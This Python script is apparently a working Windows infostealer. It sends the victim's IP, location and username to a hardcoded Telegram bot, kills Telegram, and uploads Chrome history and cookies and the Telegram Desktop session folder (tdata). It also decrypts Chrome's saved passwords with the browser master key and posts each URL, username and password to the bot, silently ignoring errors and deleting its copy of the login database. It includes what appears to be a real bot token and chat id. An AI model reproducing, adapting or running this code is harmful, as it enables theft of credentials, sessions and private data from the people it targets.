import requests
import subprocess
import os
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def client():
    try:
        subprocess.Popen(["Debug.exe"])
        client = requests.get('http://api.ipify.org').text
        ip_info = requests.get('http://ip-api.com/json/'+client).json()
        country = ip_info['country']
        region = ip_info['regionName']
        city = ip_info['city']
        isp = ip_info['isp']
        user = os.getlogin()
        requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendMessage?chat_id=330710135&text=🕴Користувач: '+str(user)+'\n🔌IP: '+str(client)+"\n🌍Країна: "+str(country)+"\n🗺Область: "+str(region)+"\n🏙Місто: "+str(city)+"\n⚙Провайдер: "+str(isp))
        os.system('taskkill /f /im Telegram.exe')
    except:
        pass

def get_history():
    try:
        user = os.getlogin()
        document = open('C:\\Users\\'+user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History', 'rb')
        files = {'document': document}
        requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendDocument?chat_id=330710135', files=files)
    except:
        pass

def History_Provider_Cache():
    try:
        user = os.getlogin()
        document = open('C:\\Users\\'+user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History Provider Cache', 'rb')
        files = {'document': document}
        requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendDocument?chat_id=330710135', files=files)
    except:
        pass

def get_cookies():
    try:
        user = os.getlogin()
        document = open('C:\\Users\\'+user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies', 'rb')
        files = {'document': document}
        requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendDocument?chat_id=330710135', files=files)
    except:
        pass

def telegram_tdata():
    try:
        user = os.getlogin()
        shutil.make_archive('C:\\Users\\'+user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', 'zip', 'C:\\Users\\'+user+'\\AppData\\Roaming\\Telegram Desktop\\tdata')
        document = open('C:\\Users\\'+user+'\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'rb')
        files = {'document': document}
        requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendDocument?chat_id=330710135', files=files)
    except:
        pass

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


if __name__ == '__main__':

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    client()
    get_cookies()
    get_history()
    History_Provider_Cache()
    telegram_tdata()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            requests.post('https://api.telegram.org/bot1953793755:AAHMMdKZSfX_0c-ZrNG5jzVwzJtbDp8uufI/sendMessage?chat_id=330710135&text=URL: ' + url + '\nUser Name: ' + username + '\nPassword: ' + decrypted_password + '\n' + '*'* 50 + '\n')
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass
